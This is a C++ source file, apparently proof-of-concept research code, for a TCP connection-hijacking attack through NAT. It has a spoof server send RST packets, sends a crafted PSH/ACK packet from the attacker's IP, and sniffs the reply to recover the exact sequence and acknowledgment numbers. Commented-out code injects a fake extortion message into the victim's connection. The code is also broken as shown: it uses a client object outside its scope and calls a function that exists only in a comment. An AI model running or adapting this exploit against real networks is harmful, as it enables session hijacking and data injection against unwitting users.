#include <iostream>
#include <memory>
#include <string>
#include <fstream>
#include <sys/select.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <time.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <net/if.h>
#include<net/ethernet.h>
#include <sys/ioctl.h>
#include <sys/time.h>

#include<pcap.h> 
#include<cstdio>
#include<set>
#include<map>


#include <pthread.h>
#include <tins/tins.h>
#include <string>
#include <chrono>
#include "httplib.h"

#include <thread>
using namespace std;
using namespace Tins;
// pseudo header needed for tcp header checksum calculation
double __get_us(struct timeval t) {
	return (t.tv_sec * 1000000 + t.tv_usec);
}


IPv4Address remote_server_ip, attacker_private_ip;
uint16_t remote_server_port;
uint16_t guessed_client_port;
uint32_t exact_seq, exact_ack;

string packet_iface;
string sniff_filter;
string spoof_server_config;

bool debug = true;

bool seq_got = false;


void trigger_spoof_server_send_rst() {
    if(debug) 
        cout << "trigger_spoof_server_send_rst: " << guessed_client_port << endl;
    httplib::Params params;
    params.emplace("guessed_client_port", to_string(guessed_client_port));
    auto res = cli.Post("/send_rst", params);
    if(debug) 
        cout << res->status << ", " << res->body << endl;
    params.clear();
}


// void trigger_spoof_server_send_junk() {
//     if(debug) std::cout << "trigger_spoof_server_send_junk" << endl;
//     params.emplace("exact_seq", to_string(exact_seq));
//     params.emplace("exact_ack", to_string(exact_ack));
//     auto res = cli.Post("/send_junk", params);
//     if(debug) std::cout << res->status << ", " << res->body << endl;
//     params.clear();
// }

void get_seq() {
    PacketSender sender;
    NetworkInterface pa_iface(packet_iface); 
	struct timeval start_time, stop_time;
	gettimeofday(&start_time, NULL);

    trigger_spoof_server_send_rst();
    gettimeofday(&stop_time, NULL);
    if(debug) std::cout << "send rsts time: " << (__get_us(stop_time) - __get_us(start_time)) / 1000 << " ms, will sleep for 10 seconds until the NAT mapping expires." << endl;
    sleep(20);
    // usleep(10500000);
    IP pa_pkt = IP(remote_server_ip, attacker_private_ip) / TCP(remote_server_port, guessed_client_port);
    pa_pkt.rfind_pdu<TCP>().set_flag(TCP::PSH, 1);
    pa_pkt.rfind_pdu<TCP>().set_flag(TCP::ACK, 1);
    pa_pkt.rfind_pdu<TCP>().seq(1);
    sender.send(pa_pkt, pa_iface);
    if(debug) std::cout << "PA packet sent, wait for the ACK back" << endl;
    while (!seq_got);
    if(debug) std::cout << "Received exact seq: " << exact_seq << endl;
    if(debug) std::cout << "Received exact ack: " << exact_ack << endl;
    gettimeofday(&stop_time, NULL);
    if(debug) std::cout << "Get seq and ack time: " << (__get_us(stop_time) - __get_us(start_time)) / 1000 << " ms" << endl;
    ofstream fout; 
	fout.open("../complete_attack/SEQ_ACK_RESULT"); 

	fout << "seq: " << exact_seq << endl;
	fout << "ack: " << exact_ack << endl;
	fout.close();

    // if(debug) std::cout << "The attacker tries to inject fake message (You are hacked!!!!!!!!!Send me some money!!!!!!) to the server!"<< endl;

    // pa_pkt = IP(remote_server_ip, attacker_private_ip) / TCP(remote_server_port, guessed_client_port) / RawPDU("You are hacked!!!!!!!!!Send me some money!!!!!!\n");
    // pa_pkt.rfind_pdu<TCP>().set_flag(TCP::PSH, 1);
    // pa_pkt.rfind_pdu<TCP>().set_flag(TCP::ACK, 1);
    // pa_pkt.rfind_pdu<TCP>().seq(exact_ack);
    // pa_pkt.rfind_pdu<TCP>().ack_seq(exact_seq);
    // sender.send(pa_pkt, pa_iface);

    // if(debug) std::cout << "Attack finished!" << endl << endl;
    // if(debug) std::cout << "clean my mapping, will sleep for 3 seconds for you to change the setting."<< endl;
    // sleep(3);
    // IP rst_pkt = IP(remote_server_ip, attacker_private_ip) / TCP(remote_server_port, guessed_client_port);
    // rst_pkt.rfind_pdu<TCP>().set_flag(TCP::RST, 1);
    // rst_pkt.rfind_pdu<TCP>().set_flag(TCP::ACK, 1);
    // rst_pkt.rfind_pdu<TCP>().seq(1);
    // sender.send(rst_pkt, pa_iface);
    // if(debug) std::cout << "will sleep for 12 seconds for the mapping disappear."<< endl;
    // sleep(12);
    // if(debug) std::cout << "clean my mapping finished" << endl;
   
}

void inject() {
    trigger_spoof_server_send_junk();
}


bool callback(const PDU &pdu) {
    const IP &ip = pdu.rfind_pdu<IP>(); 
    const TCP &tcp = pdu.rfind_pdu<TCP>(); 
	if (ip.protocol() == 6 && ip.src_addr() == remote_server_ip && ip.dst_addr() == attacker_private_ip) {
        if (tcp.sport() == remote_server_port && tcp.dport() == guessed_client_port && (tcp.flags() == TCP::ACK)) {
            exact_seq = tcp.seq();
            exact_ack = tcp.ack_seq();
            seq_got = true;
        }
	}
    return true;
}

void sniff_packets() {
    // Construct the sniffer configuration object
    SnifferConfiguration config;
    config.set_filter(sniff_filter);
	config.set_immediate_mode(true);
    Sniffer(packet_iface, config).sniff_loop(callback);
}

int main(int argc, char** argv)
{
    if (argc != 7) {
        cout << "wrong number of args ---> (attacker_private_ip, guessed_client_port, remote_server_ip, remote_server_port, spoof_server_config, packet_iface)" << endl;
        return 0;
        //e.g., sudo ./seq_infer 10.20.189.17 43.159.39.110 5904 http://43.159.39.110:5902 tun0
    }
    attacker_private_ip = IPv4Address(argv[1]);
    guessed_client_port = atoi(argv[2]);
    remote_server_ip = IPv4Address(argv[3]);
    remote_server_port = atoi(argv[4]);
    spoof_server_config = argv[5];
    packet_iface = argv[6];
    sniff_filter = "tcp port " + string(argv[4]) + " and ip src " + argv[3];

    
    // connect to the spoofable server and control it to send RST packets.
    httplib::Client cli(spoof_server_config);
    cli.set_keep_alive(true);
    cli.set_connection_timeout(0, 300000); // 300 milliseconds
    cli.set_read_timeout(10, 0); // 10 seconds
    cli.set_write_timeout(10, 0); // 10 seconds

    thread sniff_thread(sniff_packets);
    get_seq();
    sniff_thread.detach();

	return 0;
}
